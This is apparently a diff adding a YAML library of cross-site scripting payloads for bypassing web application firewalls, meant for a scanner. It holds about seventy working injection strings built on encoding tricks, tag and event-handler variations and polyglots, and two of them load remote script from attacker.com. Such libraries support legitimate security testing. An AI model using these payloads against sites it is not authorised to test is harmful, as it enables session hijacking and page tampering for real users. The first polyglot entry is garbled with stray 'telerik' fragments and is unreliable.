@@ -1,0 +1,359 @@
+metadata:
+  type: xss/waf_bypass
+  version: "1.0"
+  description: "WAF bypass XSS payloads"
+  sources: ["OWASP", "PortSwigger", "PayloadsAllTheThings", "SecLists"]
+
+detection_patterns:
+  - "alert\\s*\\("
+  - "on\\w+\\s*=.*?alert"
+
+payloads:
+  encoding_bypass:
+    - value: "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
+      description: "Decimal entity encoded alert"
+      severity: high
+      tags: [waf_bypass, encoding]
+
+    - value: "<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>"
+      description: "Hex entity encoded alert"
+      severity: high
+      tags: [waf_bypass, encoding]
+
+    - value: "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029>"
+      description: "Unicode escape alert"
+      severity: high
+      tags: [waf_bypass, encoding]
+
+    - value: "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+      description: "Base64 eval bypass"
+      severity: high
+      tags: [waf_bypass, encoding, base64]
+
+    - value: "<img src=x onerror=eval(unescape('%61%6C%65%72%74%28%31%29'))>"
+      description: "Unescape eval bypass"
+      severity: high
+      tags: [waf_bypass, encoding, unescape]
+
+    - value: "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
+      description: "String.fromCharCode bypass"
+      severity: high
+      tags: [waf_bypass, encoding, charcode]
+
+    - value: "<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')>"
+      description: "Hex string eval bypass"
+      severity: high
+      tags: [waf_bypass, encoding, hex]
+
+    - value: "<img src=x onerror=\\x61lert(1)>"
+      description: "Partial hex escape"
+      severity: high
+      tags: [waf_bypass, encoding]
+
+    - value: "<img src=x onerror=a&#108;ert(1)>"
+      description: "Mixed entity + literal"
+      severity: high
+      tags: [waf_bypass, encoding]
+
+    - value: "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+      description: "Full URL encoding"
+      severity: high
+      tags: [waf_bypass, encoding, url]
+
+    - value: "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E"
+      description: "Double URL encoding"
+      severity: high
+      tags: [waf_bypass, encoding, double_url]
+
+    - value: "<img src=x onerror=alert&#40;1&#41;>"
+      description: "Entity parentheses"
+      severity: high
+      tags: [waf_bypass, encoding]
+
+  tag_variation:
+    - value: "<svg/onload=alert(1)>"
+      description: "SVG no space"
+      severity: high
+      tags: [waf_bypass, tag]
+
+    - value: "<svg/onload=alert(1)//"
+      description: "SVG no space comment close"
+      severity: high
+      tags: [waf_bypass, tag]
+
+    - value: "<svg onload=alert(1)//"
+      description: "SVG comment close"
+      severity: high
+      tags: [waf_bypass, tag]
+
+    - value: "<ScRiPt>alert(1)</ScRiPt>"
+      description: "Mixed case script"
+      severity: high
+      tags: [waf_bypass, tag, case]
+
+    - value: "<SCRIPT>alert(1)</SCRIPT>"
+      description: "Uppercase script"
+      severity: high
+      tags: [waf_bypass, tag, case]
+
+    - value: "<scr<script>ipt>alert(1)</scr</script>ipt>"
+      description: "Nested script bypass"
+      severity: high
+      tags: [waf_bypass, tag, nested]
+
+    - value: "<script/src=//attacker.com/xss.js>"
+      description: "Remote script / separator"
+      severity: high
+      tags: [waf_bypass, tag, remote]
+
+    - value: "<script src=//attacker.com/xss.js></script>"
+      description: "Protocol-relative remote"
+      severity: high
+      tags: [waf_bypass, tag, remote]
+
+    - value: "<scr\x00ipt>alert(1)</script>"
+      description: "Null byte in tag"
+      severity: high
+      tags: [waf_bypass, tag, null_byte]
+
+    - value: "<img/src=x/onerror=alert(1)>"
+      description: "IMG / separator"
+      severity: high
+      tags: [waf_bypass, tag]
+
+    - value: "<img src=x onerror=alert(1)//"
+      description: "IMG comment close"
+      severity: high
+      tags: [waf_bypass, tag]
+
+    - value: "<img src=x onerror=alert(1)>"
+      description: "Standard IMG"
+      severity: high
+      tags: [waf_bypass, tag]
+
+    - value: "<IMG SRC=x ONERROR=alert(1)>"
+      description: "Uppercase IMG"
+      severity: high
+      tags: [waf_bypass, tag, case]
+
+    - value: "<iMg sRc=x OnErRoR=alert(1)>"
+      description: "Random case IMG"
+      severity: high
+      tags: [waf_bypass, tag, case]
+
+  event_handler_alternatives:
+    - value: "<svg onload=alert(1)>"
+      description: "SVG onload"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<body onload=alert(1)>"
+      description: "Body onload"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<input onfocus=alert(1) autofocus>"
+      description: "Input onfocus"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<input onblur=alert(1) autofocus><input autofocus>"
+      description: "Input onblur"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<select onfocus=alert(1) autofocus>"
+      description: "Select onfocus"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<textarea onfocus=alert(1) autofocus>"
+      description: "Textarea onfocus"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<details open ontoggle=alert(1)>"
+      description: "Details ontoggle"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<marquee onstart=alert(1)>"
+      description: "Marquee onstart"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<marquee onfinish=alert(1)>"
+      description: "Marquee onfinish"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<video onerror=alert(1)><source>"
+      description: "Video onerror"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<audio onerror=alert(1)><source>"
+      description: "Audio onerror"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<object data=javascript:alert(1)>"
+      description: "Object data"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<embed src=javascript:alert(1)>"
+      description: "Embed src"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<iframe onload=alert(1)>"
+      description: "Iframe onload"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<iframe src=javascript:alert(1)>"
+      description: "Iframe javascript"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<a href=javascript:alert(1)>click</a>"
+      description: "Anchor javascript"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<form action=javascript:alert(1)><input type=submit></form>"
+      description: "Form action javascript"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<isindex action=javascript:alert(1) type=image>"
+      description: "Isindex action"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<table background=javascript:alert(1)>"
+      description: "Table background"
+      severity: high
+      tags: [waf_bypass, event]
+
+    - value: "<div style=\"width:expression(alert(1))\">"
+      description: "CSS expression"
+      severity: high
+      tags: [waf_bypass, event, css]
+
+    - value: "<div style=\"background:url(javascript:alert(1))\">"
+      description: "CSS background"
+      severity: high
+      tags: [waf_bypass, event, css]
+
+    - value: "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">"
+      description: "MathML xlink"
+      severity: high
+      tags: [waf_bypass, event, mathml]
+
+    - value: "<foreignObject><body onload=alert(1)></foreignObject>"
+      description: "SVG foreignObject"
+      severity: high
+      tags: [waf_bypass, event, svg]
+
+  polyglot:
+    - value: "javascript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik11telerik/telerik/oNcliCk=alert()//>/telerik<telerik/telerik/oNcliCk=alert()//>>telerik<</telerik/oNcliCk=alert()/telerik*/alert()/*</telerik></telerik>*/alert()//"
+      description: "XSS polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "'-alert(1)-'"
+      description: "Expression polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "\";alert(1);//"
+      description: "Semicolon polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "\"><img src=x onerror=alert(1)//"
+      description: "Quote breakout polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "</script><script>alert(1)</script>"
+      description: "Script close polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "'-alert(1)//"
+      description: "Comment close expression"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "\" onclick=alert(1) x=\""
+      description: "Attribute injection"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "' onmouseover=alert(1) x='"
+      description: "Single quote attribute"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "\" onmouseover=alert(1) \""
+      description: "Double quote attribute"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "/><script>alert(1)</script>"
+      description: "Self-closing breakout"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "'-alert(1)-''"
+      description: "Double quote expression"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "\"-alert(1)-\"\""
+      description: "Double quote double"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "';alert(1);//"
+      description: "Single quote semicolon"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "'-alert(1);'"
+      description: "Semicolon expression"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "<svg/onload=alert`1`>"
+      description: "SVG template literal"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "<img src=x onerror=alert`1`>"
+      description: "IMG template literal"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "eval(atob('YWxlcnQoMSk='))"
+      description: "eval+atob polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+      description: "SVG animate polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "<svg><set onbegin=alert(1) attributeName=onload>"
+      description: "SVG set polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
+
+    - value: "<xss id=x tabindex=1 onfocus=alert(1)></xss>"
+      description: "Custom tag polyglot"
+      severity: high
+      tags: [waf_bypass, polyglot]
